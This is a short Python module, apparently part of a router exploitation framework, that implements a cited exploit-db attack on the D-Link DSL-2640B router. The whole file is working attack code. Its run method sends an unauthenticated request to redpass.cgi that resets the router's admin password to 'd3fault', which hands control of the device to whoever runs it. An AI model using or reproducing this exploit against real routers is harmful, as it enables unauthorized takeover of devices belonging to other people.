import urllib
import util
from ..router_vuln import RouterVuln


class change_admin_2640(RouterVuln):
    """Modify the admin password.
       http://www.exploit-db.com/exploits/18499/
    """
    def __init__(self):
        self.router = 'DSL-2640B'
        self.vuln   = 'Change Admin Password'
        super(change_admin_2640, self).__init__()

    def run(self):
        util.Msg('Changing admin password to \'d3fault\'...')
        try:
            url = 'http://%s/redpass.cgi?sysPassword=d3fault&change=1' % self.ip
            urllib.urlopen(url).read()
            util.Msg('Done.  Admin password changed to \'d3fault\'')
        except Exception, e:
            util.Error('Error: %s' % e)
            return
